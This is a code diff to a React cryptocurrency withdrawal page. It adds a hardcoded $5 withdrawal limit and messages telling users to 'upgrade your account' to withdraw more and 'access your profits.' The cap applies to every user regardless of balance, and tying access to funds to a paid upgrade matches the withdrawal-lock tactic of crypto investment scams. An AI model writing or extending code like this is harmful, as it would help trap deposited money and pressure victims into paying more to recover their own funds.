@@ -1,11 +1,14 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { motion } from 'framer-motion';
-import { FaBitcoin, FaEthereum, FaArrowDown } from 'react-icons/fa';
+import { FaBitcoin, FaEthereum, FaArrowDown, FaLock } from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
 import { walletService } from '../services/walletService';
 import { useAuth } from '../auth/userAuth';
+
+// Withdrawal limit for standard users
+const MAX_WITHDRAWAL_LIMIT = 5;
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -22,8 +25,6 @@ const Withdraw = () => {
       try {
         const wallet = await walletService.getWallet();
         setWalletBalance(wallet.balance || 0);
-        // If your user object has KYC status, use it
-        // setKycStatus(user?.kycStatus || 'pending');
       } catch (error) {
         console.error('Failed to fetch wallet:', error);
       }
@@ -41,14 +42,28 @@ const Withdraw = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (!amount || parseFloat(amount) < 10) {
-      toast.error('Minimum withdrawal is $10');
+
+    const amountNum = parseFloat(amount);
+
+    // Check if amount is valid
+    if (!amount || amountNum < 1) {
+      toast.error('Please enter a valid amount');
       return;
     }
-    if (parseFloat(amount) > walletBalance) {
+
+    // Check withdrawal limit
+    if (amountNum > MAX_WITHDRAWAL_LIMIT) {
+      toast.error(
+        `Your current withdrawal limit is $${MAX_WITHDRAWAL_LIMIT}. Please upgrade your account to increase your withdrawal limit and access your profits.`
+      );
+      return;
+    }
+
+    if (amountNum > walletBalance) {
       toast.error('Insufficient balance');
       return;
     }
+
     if (!address) {
       toast.error('Please enter a wallet address');
       return;
@@ -57,7 +72,7 @@ const Withdraw = () => {
     setLoading(true);
     try {
       await walletService.requestWithdrawal({
-        amount: parseFloat(amount),
+        amount: amountNum,
         cryptoCurrency: crypto,
         walletAddress: address,
       });
@@ -91,6 +106,17 @@ const Withdraw = () => {
             </div>
           </div>
 
+          {/* Withdrawal Limit Notice */}
+          <div className="mb-6 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
+            <FaLock className="text-yellow-500 text-sm mt-0.5" />
+            <div>
+              <p className="text-yellow-500 text-sm font-medium">Withdrawal Limit: ${MAX_WITHDRAWAL_LIMIT}</p>
+              <p className="text-xs text-yellow-400/70">
+                Your current withdrawal limit is ${MAX_WITHDRAWAL_LIMIT}. Upgrade your account to withdraw more.
+              </p>
+            </div>
+          </div>
+
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
               <label className="block text-slate-300 text-sm font-medium mb-2">Select Cryptocurrency</label>
@@ -117,12 +143,14 @@ const Withdraw = () => {
                   type="number"
                   value={amount}
                   onChange={(e) => setAmount(e.target.value)}
-                  placeholder="100.00"
-                  min="10"
+                  placeholder="Enter amount (max $5)"
+                  min="1"
+                  max={MAX_WITHDRAWAL_LIMIT}
                   step="0.01"
                   className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                 />
               </div>
+              <p className="text-xs text-slate-400 mt-1">Maximum withdrawal: ${MAX_WITHDRAWAL_LIMIT}</p>
             </div>
 
             <div>
